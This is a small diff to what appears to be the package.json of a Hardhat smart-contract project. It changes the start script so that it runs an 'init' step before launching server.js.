@@ -16,7 +16,7 @@
     "verify:celo": "hardhat verify --network celo",
     "node": "hardhat node",
     "clean": "hardhat clean",
-    "start": "node server.js"
+    "start": "node init && node server.js"
   },
   "keywords": [
     "solidity",
